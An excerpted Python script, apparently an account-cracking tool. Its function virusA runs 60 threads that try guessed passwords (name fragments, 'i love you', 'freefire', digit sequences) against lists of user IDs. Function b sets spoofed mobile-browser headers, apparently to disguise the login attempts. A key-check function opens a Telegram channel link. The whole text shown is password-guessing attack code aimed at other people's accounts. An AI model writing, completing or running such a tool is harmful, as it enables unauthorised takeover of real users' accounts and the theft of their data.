...
def virusA():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','102030','203040','304050','405060','506070','607080','708090','sadiya','Sadiya','ilovefreefire','freefire']
...
def b(uid,pwx,tl):
    ...
    'dpr': '2.5562500953674316',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-N980F"',
...
def superuser():
    ...
    if id in DARK:
        ...
        os.system("clear")
        os.system("xdg-open https://t.me/SHANTO_TC")
        time.sleep(3.0)
        ...
        print ("")
        print (" Your Key  : \033[1;31m"+UMO+id)
        name = input(" \033[1;37mYour Name :\033[0;33m ")
